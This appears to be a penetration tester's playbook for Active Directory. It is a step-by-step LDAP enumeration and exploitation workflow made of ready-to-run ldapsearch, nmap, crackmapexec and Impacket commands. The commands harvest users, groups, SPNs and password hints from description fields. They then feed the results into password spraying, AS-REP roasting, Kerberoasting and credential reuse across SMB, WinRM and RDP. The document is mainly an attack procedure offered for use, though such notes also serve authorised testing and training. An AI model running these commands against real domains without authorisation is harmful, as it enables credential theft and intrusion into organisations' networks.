# LDAP Enumeration & Exploitation

## Purpose

This file provides a structured workflow for enumerating LDAP and extracting valuable Active Directory data.

Core rules:

* LDAP = information goldmine
* Always extract users, groups, SPNs, descriptions
* Feed results into Kerberos attacks and credential validation

---

## 0. Identify LDAP

Common ports:

* 389 (LDAP)
* 636 (LDAPS)
* 3268 (Global Catalog)

Confirm with:

```bash id="j4bn7g"
nmap -p 389,636,3268 -sV <IP>
```

---

## 1. Get Naming Context (START HERE)

```bash id="e3jmtz"
ldapsearch -x -H ldap://<IP> -s base namingcontexts
```

Look for:

* DC=domain,DC=local

---

## 2. Anonymous Enumeration

```bash id="5x7qln"
ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local"
```

If allowed, this is extremely valuable.

---

## 3. Authenticated Enumeration

```bash id="x7ewb7"
ldapsearch -x -H ldap://<IP> -D 'DOMAIN\user' -w 'pass' -b "DC=domain,DC=local"
```

Alternative:

```bash id="ov6q0x"
ldapsearch -x -H ldap://<IP> -D 'user@domain.local' -w 'pass' -b "DC=domain,DC=local"
```

---

## 4. Extract Users

```bash id="n3c8qj"
ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local" "(objectClass=user)"
```

Key fields:

* sAMAccountName
* userPrincipalName
* description
* memberOf

---

## 5. Extract Groups

```bash id="2cl7dq"
ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local" "(objectClass=group)"
```

Look for:

* Domain Admins
* Administrators
* Backup Operators
* Remote Desktop Users

---

## 6. Extract Computers

```bash id="wmtprc"
ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local" "(objectClass=computer)"
```

Use for:

* lateral movement targets

---

## 7. Extract SPNs (Kerberoasting Targets)

```bash id="i3k3op"
ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local" "(servicePrincipalName=*)"
```

These accounts are:
→ Kerberoastable

---

## 8. Extract Descriptions (HIGH VALUE)

```bash id="5kq3sm"
ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local" "(description=*)"
```

Look for:

* passwords
* hints
* service credentials

---

## 9. Password Policy Clues

```bash id="hl8z7u"
ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local" "(objectClass=domain)"
```

Look for:

* lockout thresholds
* password requirements

---

## 10. Build Username List

Extract:

* sAMAccountName
* userPrincipalName

Save to:

```text id="9mjwqg"
users.txt
```

Used for:

* password spraying
* Kerberos attacks

---

## 11. Credential Testing

Test creds against:

```bash id="mj0flp"
crackmapexec ldap <IP> -u user -p pass -d DOMAIN
```

Also test:

* SMB
* WinRM
* RDP

---

## 12. Kerberos Integration

LDAP findings feed into:

### AS-REP Roasting

```bash id="9r43y7"
GetNPUsers.py DOMAIN.LOCAL/ -dc-ip <IP> -usersfile users.txt -no-pass
```

### Kerberoasting

```bash id="u7msd2"
GetUserSPNs.py DOMAIN.LOCAL/user:pass -dc-ip <IP> -request
```

---

## 13. Identify High-Value Targets

Look for:

* service accounts
* admin users
* accounts in privileged groups
* accounts with SPNs
* accounts with weak descriptions

---

## 14. Pivot Opportunities

LDAP can reveal:

* new hosts
* new users
* new services
* trust relationships

---

## 15. If Anonymous Fails

Try:

* valid creds
* password spraying
* SMB enumeration instead

---

## 16. If Stuck

RESET:

* re-run LDAP queries
* search descriptions again
* re-check SPNs
* validate creds everywhere

---

## 17. Mental Model

* LDAP = map of the domain
* Users = attack surface
* SPNs = cracking targets
* Descriptions = hidden secrets

---

## 18. Golden Rules

* Always extract users
* Always check descriptions
* Always look for SPNs
* Always reuse credentials
